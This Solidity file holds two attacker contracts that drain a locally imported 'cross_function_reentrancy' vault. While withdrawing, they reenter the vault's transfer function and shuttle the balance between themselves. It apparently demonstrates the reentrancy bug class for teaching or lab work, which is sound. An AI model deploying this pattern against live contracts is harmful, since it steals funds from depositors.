// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./vault.sol";

contract attack_cross_function_reentrancy {
    cross_function_reentrancy victim;
    uint256 amount = 1 ether;

    attack2_cross_function_reentrancy public attacker2;

    constructor(cross_function_reentrancy _victim) {
        victim = cross_function_reentrancy(_victim);
    }

    function setattacker2(address _attacker2) public {
        attacker2 = attack2_cross_function_reentrancy(_attacker2);
    }

    function attack() public payable {
        victim.deposit{value: msg.value}();
        while(address(victim).balance >= amount) {
            victim.withdraw();
            attacker2.send(msg.value, address(this));
        }
    }

    receive() external payable {
        victim.transfer(address(attacker2), msg.value);
    }
}

contract attack2_cross_function_reentrancy {

 
    uint256 amount = 1 ether;
    cross_function_reentrancy victim;

    constructor(cross_function_reentrancy _victim) {
        victim = cross_function_reentrancy(_victim);
    }

    function send(uint256 value, address attacker) public {
        victim.transfer(attacker, value);
    }

}


